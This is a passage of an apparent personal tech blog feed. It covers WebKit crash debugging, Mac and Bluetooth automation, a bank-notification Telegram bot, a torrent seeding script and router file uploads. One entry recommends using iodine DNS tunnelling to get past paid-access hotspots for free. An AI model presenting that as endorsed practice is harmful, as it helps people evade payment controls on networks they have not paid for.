&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;10  com.apple.WebCore             	0x000000026a4343af WebCore::RenderBlock::paint(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 271
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;11  com.apple.WebCore             	0x000000026a4347fa WebCore::RenderBlock::paintChild(WebCore::RenderBox&amp;amp;amp;, WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;, WebCore::PaintInfo&amp;amp;amp;, bool, WebCore::RenderBlock::PaintBlockType) + 666
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;12  com.apple.WebCore             	0x000000026a43452f WebCore::RenderBlock::paintChildren(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;, WebCore::PaintInfo&amp;amp;amp;, bool) + 95
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;13  com.apple.WebCore             	0x000000026a434bc3 WebCore::RenderBlock::paintObject(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 739
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;14  com.apple.WebCore             	0x000000026a4343af WebCore::RenderBlock::paint(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 271
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;15  com.apple.WebCore             	0x000000026a4347fa WebCore::RenderBlock::paintChild(WebCore::RenderBox&amp;amp;amp;, WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;, WebCore::PaintInfo&amp;amp;amp;, bool, WebCore::RenderBlock::PaintBlockType) + 666
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;16  com.apple.WebCore             	0x000000026a43452f WebCore::RenderBlock::paintChildren(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;, WebCore::PaintInfo&amp;amp;amp;, bool) + 95
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;17  com.apple.WebCore             	0x000000026a434bc3 WebCore::RenderBlock::paintObject(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 739
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;18  com.apple.WebCore             	0x000000026a4343af WebCore::RenderBlock::paint(WebCore::PaintInfo&amp;amp;amp;, WebCore::LayoutPoint const&amp;amp;amp;) + 271
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;19  com.apple.WebCore             	0x000000026a500033 WebCore::RenderLayer::paintForegroundForFragmentsWithPhase(WebCore::PaintPhase, WTF::Vector&amp;amp;lt;WebCore::LayerFragment, 1ul, WTF::CrashOnOverflow, 16ul&amp;amp;gt; const&amp;amp;amp;, WebCore::GraphicsContext&amp;amp;amp;, WebCore::RenderLayer::LayerPaintingInfo const&amp;amp;amp;, unsigned int, WebCore::RenderObject*) + 403
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;20  com.apple.WebCore             	0x000000026a4fd809 WebCore::RenderLayer::paintForegroundForFragments(WTF::Vector&amp;amp;lt;WebCore::LayerFragment, 1ul, WTF::CrashOnOverflow, 16ul&amp;amp;gt; const&amp;amp;amp;, WebCore::GraphicsContext&amp;amp;amp;, WebCore::GraphicsContext&amp;amp;amp;, WebCore::LayoutRect const&amp;amp;amp;, bool, WebCore::RenderLayer::LayerPaintingInfo const&amp;amp;amp;, unsigned int, WebCore::RenderObject*) + 393
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;21  com.apple.WebCore             	0x000000026a4fa829 WebCore::RenderLayer::paintLayerContents(WebCore::GraphicsContext&amp;amp;amp;, WebCore::RenderLayer::LayerPaintingInfo const&amp;amp;amp;, unsigned int) + 2697
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;22  com.apple.WebCore             	0x000000026a4fa8e2 WebCore::RenderLayer::paintLayerContents(WebCore::GraphicsContext&amp;amp;amp;, WebCore::RenderLayer::LayerPaintingInfo const&amp;amp;amp;, unsigned int) + 2882
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;23  com.apple.WebCore             	0x000000026a4f7e01 WebCore::RenderLayer::paint(WebCore::GraphicsContext&amp;amp;amp;, WebCore::LayoutRect const&amp;amp;amp;, WebCore::LayoutSize const&amp;amp;amp;, unsigned int, WebCore::RenderObject*, unsigned int, WebCore::RenderLayer::SecurityOriginPaintPolicy) + 273
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;24  com.apple.WebCore             	0x000000026a1a64a7 WebCore::FrameView::paintContents(WebCore::GraphicsContext&amp;amp;amp;, WebCore::IntRect const&amp;amp;amp;, WebCore::Widget::SecurityOriginPaintPolicy) + 743
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;25  com.apple.WebCore             	0x000000026a24e5ee WebCore::ScrollView::paint(WebCore::GraphicsContext&amp;amp;amp;, WebCore::IntRect const&amp;amp;amp;, WebCore::Widget::SecurityOriginPaintPolicy) + 574
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;26  com.apple.WebCore             	0x000000026a1a619d WebCore::FrameView::traverseForPaintInvalidation(WebCore::GraphicsContext::PaintInvalidationReasons) + 253
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;27  com.apple.WebKit              	0x0000000108a96e8a WebKit::RemoteLayerTreeDrawingArea::flushLayers() + 340
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;28  com.apple.WebCore             	0x000000026a259f00 WebCore::ThreadTimers::sharedTimerFiredInternal() + 336
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;29  com.apple.WebCore             	0x000000026a2a75ef WebCore::timerFired(__CFRunLoopTimer*, void*) + 31
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;30  com.apple.CoreFoundation      	0x0000000109469f34 __CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 20
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;31  com.apple.CoreFoundation      	0x0000000109469b32 __CFRunLoopDoTimer + 1026
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;32  com.apple.CoreFoundation      	0x000000010946939a __CFRunLoopDoTimers + 266
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;33  com.apple.CoreFoundation      	0x0000000109463a1c __CFRunLoopRun + 2252
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;34  com.apple.CoreFoundation      	0x0000000109462e11 CFRunLoopRunSpecific + 625
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;35  com.apple.Foundation          	0x00000001083ee322 -[NSRunLoop(NSRunLoop) runMode:beforeDate:] + 277
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;36  com.apple.Foundation          	0x00000001083ee492 -[NSRunLoop(NSRunLoop) run] + 76
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;37  libxpc.dylib                  	0x000000010ba72812 _xpc_objc_main + 460
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;38  libxpc.dylib                  	0x000000010ba74cbd xpc_main + 143
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;39  com.apple.WebKit.WebContent   	0x00000001083332d9 0x108332000 + 4825
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;40  libdyld.dylib                 	0x000000010b76b575 start + 1
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;...
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h2 id=&amp;quot;debugging-using-xcode&amp;quot;&amp;gt;Debugging using Xcode&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;At this point you should already know the area of code you want to put breakpoints in. For convenience reasons - I chose to use Xcode over lldb for debugging. To do that you must configure Xcode to use the command-line-built binaries instead of rebuilding it itself. Do that by following the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;webkit.org&amp;#x2F;debugging-webkit&amp;#x2F;#debugging-using-xcode&amp;quot;&amp;gt;Debugging using Xcode section&amp;lt;&amp;#x2F;a&amp;gt; of the WebKit guide.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Now you can attach Xcode to the right WebKit process within the simulator. &amp;lt;strong&amp;gt;Important notice that also took me a long time to figure out - WebKit has multiple different processes for every tab.&amp;lt;&amp;#x2F;strong&amp;gt; So the process ID printed when you run &amp;lt;code&amp;gt;Tools&amp;#x2F;Scripts&amp;#x2F;run-safari&amp;lt;&amp;#x2F;code&amp;gt; is &amp;lt;strong&amp;gt;not&amp;lt;&amp;#x2F;strong&amp;gt; the one you want to attach to usually. In my example, I saw my crash is in &amp;lt;em&amp;gt;WebCore&amp;lt;&amp;#x2F;em&amp;gt;, so I attached to the &amp;lt;em&amp;gt;com.apple.WebKit.WebContent.Development&amp;lt;&amp;#x2F;em&amp;gt; within the simulator. If my bug was related to the networking part of WebKit, I would have attached to a different process. The different process names are documented &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;webkit.org&amp;#x2F;debugging-webkit&amp;#x2F;#processes&amp;quot;&amp;gt;here&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;strong&amp;gt;You can distinguish the debug versions from the real stable versions by the process names -&amp;lt;&amp;#x2F;strong&amp;gt; WebKit process names that end &amp;lt;code&amp;gt;.Development&amp;lt;&amp;#x2F;code&amp;gt; are the debug versions.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;submitting-the-fix&amp;quot;&amp;gt;Submitting the Fix&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;If you found and fixed the bug, follow &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;webkit.org&amp;#x2F;contributing-code&amp;#x2F;&amp;quot;&amp;gt;WebKit’s guide for submitting a patch&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Good luck!&amp;lt;&amp;#x2F;p&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>Lock Mac After Inactivity</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-03-15-lock-mac-after-inactivity&#x2F;"/>
            <updated>2019-03-15T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-03-15-lock-mac-after-inactivity&#x2F;</id>
            <content type="html">&amp;lt;p&amp;gt;Mac comes with a shortcut for locking the desktop session - &amp;lt;code&amp;gt;⌘ + Ctrl + Q&amp;lt;&amp;#x2F;code&amp;gt;. It is also possible to &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;maclovin.org&amp;#x2F;blog-native&amp;#x2F;2017&amp;#x2F;high-sierra-set-a-global-shortcut-to-lock-screen&amp;quot;&amp;gt;define another keyboard shortcut for that&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;In my case, I wanted the screen to lock automatically after I’m idle for a certain period of time. That’s also easily configured by following these steps:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ol&amp;gt;
&amp;lt;li&amp;gt;Launch System Preferences -&amp;amp;gt; Desktop &amp;amp;amp; Screen Saver -&amp;amp;gt; Screen Saver&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Change the &amp;quot;Start after:&amp;quot; value in the left bottom corner to the requested idle time (in my case - 1 minute).&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;On System Preferences -&amp;amp;gt; Security &amp;amp;amp; Privacy -&amp;amp;gt; General - mark &amp;quot;Require password &amp;lt;strong&amp;gt;immediately&amp;lt;&amp;#x2F;strong&amp;gt; after sleep or screen saver begins&amp;quot;&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ol&amp;gt;
&amp;lt;p&amp;gt;This was a good solution, but my workplace setup a group policy (by enforcing a configuration profile) that sets the &amp;quot;Start after&amp;quot; time in the screen saver pane to 20 minutes, which is &amp;lt;em&amp;gt;way&amp;lt;&amp;#x2F;em&amp;gt; too long for me.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;To solve that, I wrote this small cron task that checks your inactivity time, and launches the screen saver manually if enough time has passed. You can find the code + installation instructions &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;manual-screensaver-cron&amp;quot;&amp;gt;here&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>QuietComfort 35 + MacBook + iPhone Bluetooth Connectivity</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-03-14-quietcomfort-35-macbook-iphone-bluetooth-connectivity&#x2F;"/>
            <updated>2019-03-14T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-03-14-quietcomfort-35-macbook-iphone-bluetooth-connectivity&#x2F;</id>
            <content type="html">&amp;lt;p&amp;gt;I received QuietComfort 35 from work, and I loved it from the first moment I used it. It’s always connected to my work Mac, my personal Mac and to my iPhone.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;But whenever I leave work &amp;#x2F; home and close my laptop lid - I would expect the seamless reaction for the headphones to switch automatically to my iPhone audio while disconnecting from my now-sleeping Mac.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The current behaviour is far from that. My Mac stays connected even with it’s lid shut in my backpack, and I have to manually open the Bose app on my phone and switch the Mac connection off.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;I was looking for a solution to turn off Bluetooth when lid is shut - but sadly the only one I could find is &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.controlplaneapp.com&amp;#x2F;&amp;quot;&amp;gt;ControlPlane&amp;lt;&amp;#x2F;a&amp;gt;, which apparently used to be an app that lets you perform actions on Mac system events (such as lid closed &amp;#x2F; opened). Sadly I gave it a try and it seems broken on newer Macs.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Today I found this amazing app - &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.dssw.co.uk&amp;#x2F;powermanager&amp;#x2F;&amp;quot;&amp;gt;Power Manager&amp;lt;&amp;#x2F;a&amp;gt;. With this app, along with a small Bluetooth command line utility, my problem was solved easily.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;You can download my Power Manager profile &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.dropbox.com&amp;#x2F;s&amp;#x2F;ax60yhy0anhn0qi&amp;#x2F;BluetoothSchedule.pm-schedule&amp;quot;&amp;gt;here&amp;lt;&amp;#x2F;a&amp;gt;, please note it requires the installation of &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;toy&amp;#x2F;blueutil&amp;quot;&amp;gt;blueutil&amp;lt;&amp;#x2F;a&amp;gt;, available via Homebrew. The profile basically runs &amp;lt;code&amp;gt;blueutil -p 0&amp;lt;&amp;#x2F;code&amp;gt; before sleep (lid close), and &amp;lt;code&amp;gt;blueutil -p 1&amp;lt;&amp;#x2F;code&amp;gt; on wake (lid open).&amp;lt;&amp;#x2F;p&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>Iodine and Paid-Access Hotspot Situations</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-01-19-iodine-and-paid-access-hotspot-situations&#x2F;"/>
            <updated>2019-01-19T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-01-19-iodine-and-paid-access-hotspot-situations&#x2F;</id>
            <content type="html">&amp;lt;p&amp;gt;I travel a lot and find myself in many situations where I’m connected to a hotspot but have to pay to get access to the Internet.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;If you haven’t heard about &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;code.kryo.se&amp;#x2F;iodine&amp;#x2F;&amp;quot;&amp;gt;iodine&amp;lt;&amp;#x2F;a&amp;gt; yet, it’s a solution that lets you tunnel IP packets over valid DNS requests. This is a solution just for these problems, as most paid-access hotspots allow valid DNS-requests and responses to go through.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;There are many guides on setting up an iodine setup, including &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;demgeeks.com&amp;#x2F;hack-get-free-wifi-on-paid-access-hotspots&amp;#x2F;&amp;quot;&amp;gt;this one&amp;lt;&amp;#x2F;a&amp;gt; for example. The problem is - the established connection is usually too slow to actually do something with it, from my experience.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;iodine lets you SSH into the installed iodine server (over DNS requests&amp;#x2F;responses). Usually people setup an SSH tunnel and use their personal computer regularly.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;If that is too slow for you (like it is for me) - I recommend installing a bunch of utilities &amp;lt;strong&amp;gt;on the server itself&amp;lt;&amp;#x2F;strong&amp;gt; so the server does all massive Internet traffic, and you just get the output through the SSH shell.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;My setup is a cheap $10-a-month DigitalOcean server with the following programs installed:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Reddit client for Terminal - &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;michael-lazar&amp;#x2F;rtv&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;michael-lazar&amp;#x2F;rtv&amp;lt;&amp;#x2F;a&amp;gt;&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Facebook Messenger client for Terminal - &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;mjkaufer&amp;#x2F;Messer&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;mjkaufer&amp;#x2F;Messer&amp;lt;&amp;#x2F;a&amp;gt;&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;Since I installed these I don’t need to create the SSH tunnel anymore, I just run them from the SSH shell and enjoy a relatively fast way of communicating for free.&amp;lt;&amp;#x2F;p&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>Israel Finance Telegram Bot</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-01-19-israel-finance-telegram-bot&#x2F;"/>
            <updated>2019-01-19T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-01-19-israel-finance-telegram-bot&#x2F;</id>
            <content type="html">&amp;lt;p&amp;gt;When it comes to monitoring your expenses, different people have different methods. Some read the monthly-sent billing summary from each credit card provider &amp;#x2F; bank, some login to these services repeatedly to check if there’s something new. I prefer getting the expenses as phone notifications while I can still remember what the expense was for, not a month after.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;When I was an Android owner I used to pay a (very cheap) subscription fee for an app called &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;play.google.com&amp;#x2F;store&amp;#x2F;apps&amp;#x2F;details?id=com.applaudsoftware.safecharge&amp;quot;&amp;gt;חיוב בטוח&amp;lt;&amp;#x2F;a&amp;gt;. This app was perfect for me - it scraped the credit card providers for new transactions and let me choose whether I approve &amp;#x2F; deny this transaction, so I can review those I denied when I have time. Using this method I found multiple subscriptions that I thought I cancelled and billings that were for the wrong amount.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;But although I love this app, I can’t ignore my 3 problems with it:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;It only supports Android (I moved to iPhone and I don’t have this solution anymore)&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;I don’t trust closed-source solutions I enter my credit card credentials into (how do I know it’s not being uploaded?)&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;It doesn’t support bank accounts, only credit cards&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;Mainly because of the iPhone transition, I was left without a working solution. So I decided to develop one.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;My solution is a small Telegram bot script that can run on your computer, scrapes the credit card &amp;lt;strong&amp;gt;and bank&amp;lt;&amp;#x2F;strong&amp;gt; accounts (using the open-source &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;eshaham&amp;#x2F;israeli-bank-scrapers&amp;quot;&amp;gt;Israeli Bank Scrapers&amp;lt;&amp;#x2F;a&amp;gt; project) and sends you notifications about new transactions using Telegram. It also supports &amp;quot;denying transactions&amp;quot; (marking them as denied so you can look into them later on). Most importantly - it’s open-source! So you don’t have to trust me your credentials aren’t being uploaded anywhere, you’re the one running the script on your computer and you can read the 1 file of source code yourself.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;If you’re like me and need this solution - have a look at the project’s GitHub page: &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;israel-finance-telegram-bot&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;israel-finance-telegram-bot&amp;lt;&amp;#x2F;a&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>TorrentLeechSeeder and DLink DSL-6740U File Upload</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2018-02-17-torrentleechseeder-and-dlink-dsl-6740u-file-upload&#x2F;"/>
            <updated>2018-02-17T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2018-02-17-torrentleechseeder-and-dlink-dsl-6740u-file-upload&#x2F;</id>
            <content type="html">&amp;lt;p&amp;gt;I recently worked on 2 useful mini-projects that I wanted to share, in case it’s useful to anyone.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;torrentleechseeder&amp;quot;&amp;gt;TorrentLeechSeeder&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;My home Internet connection is slow. Especially the upload. It was hurting my upload&amp;#x2F;download ratio in the popular BitTorrent tracker BitTorrent tracker &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;http:&amp;#x2F;&amp;#x2F;torrentleech.org&amp;quot;&amp;gt;TorrentLeech&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;I started choosing torrents to download by the amount of seeders &amp;#x2F; leechers they have, but doing this manually took too much time.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;So I wrote a script that scrapes TorrentLeech searching for the most &amp;quot;efficient&amp;quot; torrents to download and then seed, using &amp;quot;aria2c&amp;quot; for downloading&amp;#x2F;seeding.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;You can read more and clone the code at GitHub:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;TorrentLeechSeeder.git&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;TorrentLeechSeeder.git&amp;lt;&amp;#x2F;a&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;dlink-dsl-6740u-file-upload&amp;quot;&amp;gt;DLink DSL-6740U File Upload&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;As I previously mentioned - my home Internet connection is &amp;lt;strong&amp;gt;*very*&amp;lt;&amp;#x2F;strong&amp;gt; slow.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;I wanted to upload tcpdump to see what’s taking all my bandwidth, but there was no nc, wget or anything useful - only httpd.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;So I wrote a small guide with snippets of how to upload any files (including the right statically-compiled tcpdump binary).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;You can find it here on GitHub:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;DSL-6740UFileUpload&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;DSL-6740UFileUpload&amp;lt;&amp;#x2F;a&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>AS3992 Python API</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2015-05-08-as3992-python-api&#x2F;"/>
            <updated>2015-05-08T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2015-05-08-as3992-python-api&#x2F;</id>
            <content type="html">&amp;lt;p&amp;gt;A while ago I wrote down a small Python script to control AS3992 RFID reader via UART to USB.&amp;lt;br &amp;#x2F;&amp;gt;
The source is available at &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;pyAS3992&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;pyAS3992&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>Compiling Kernel for Radxa Rock Pro (+ rtl8187l support)</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2015-05-02-compiling-new-kernel-for-radxa-rock-pro-rtl8187l-support&#x2F;"/>
            <updated>2015-05-02T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2015-05-02-compiling-new-kernel-for-radxa-rock-pro-rtl8187l-support&#x2F;</id>
            <content type="html">&amp;lt;p&amp;gt;In the past few weeks I’ve been struggling to compile a kernel module for the Radxa Rock Pro, and ended up compiling the upstream kernel manually while configuring it to support my module.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Since it took much longer than I expected (mainly because of unexpected problems I wish I had known before I took this project), I decided to make a post describing my adventures with this wonderful device (and yes, I had to open a new blog to do that 🙃).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;In this blog post I will try to describe the steps I had to make, including download links, of configuring, compiling and loading the upstream Linux kernel for the Radxa Rock Pro device.&amp;lt;&amp;#x2F;p&amp;gt;
